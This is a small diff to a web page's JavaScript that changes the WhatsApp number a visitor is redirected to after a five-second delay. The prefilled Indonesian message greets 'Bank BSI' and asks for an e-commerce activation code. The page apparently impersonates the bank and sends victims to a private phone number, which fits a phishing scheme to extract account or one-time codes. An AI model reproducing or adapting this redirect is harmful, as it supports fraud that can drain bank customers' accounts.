@@ -50,7 +50,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6283871106662&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗦𝗜%0ASaya mau request kode E-Commerce Aktivasi';
+location.href='https://api.whatsapp.com/send?phone=6287835434272&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗦𝗜%0ASaya mau request kode E-Commerce Aktivasi';
     }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
